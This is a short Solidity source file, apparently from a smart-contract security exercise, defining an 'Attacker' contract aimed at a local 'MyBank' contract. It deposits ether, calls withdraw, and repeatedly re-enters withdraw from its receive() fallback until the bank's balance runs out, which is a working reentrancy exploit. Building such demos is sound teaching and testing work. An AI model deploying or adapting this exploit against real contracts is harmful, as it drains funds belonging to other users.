// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.7.6;

import "./MyBank.sol";
import "hardhat/console.sol";

contract Attacker {
    MyBank public bank;

    function setBank(address aBank) external {
        bank = MyBank(aBank);
    }
     
    function attack() external payable {
        bank.pay{ value:msg.value }("Franco Liberali");
        bank.withdraw(msg.value);
    }
    
    receive() external payable {
        if (bank.getBalance() >= msg.value) {
            bank.withdraw(msg.value);
        } 
    }
}